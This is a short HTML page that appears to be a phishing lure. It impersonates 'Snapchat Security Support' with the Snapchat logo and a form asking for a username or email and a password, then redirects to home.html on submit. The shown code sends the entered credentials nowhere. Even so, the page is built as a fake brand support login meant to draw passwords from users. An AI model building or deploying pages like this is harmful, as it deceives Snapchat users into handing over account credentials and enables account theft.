<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <title>Snapchat Service Support</title>
  <link rel="stylesheet" href="style.css" />
</head>
<body>
  <div class="container">
    <div class="login-container img ">
      <img src="Snapchat app icon Tech Blog ❤ liked on Polyvore featuring extras.jpeg" alt="Snapchat logo ">
    </div>
    
    <h2>Snapchat Security Support</h2>
    <form onsubmit="redirectToHome(event)">
      <input type="text" name="username" placeholder="Username or Email" required />
      <input type="password" name="password" placeholder="Password" required />
      <button type="submit">Submit</button>
    </form>
    
  </div>

  <script>
    function redirectToHome(e) {
      e.preventDefault();
      window.location.href = 'home.html';
    }
  </script>
</body>
</html>
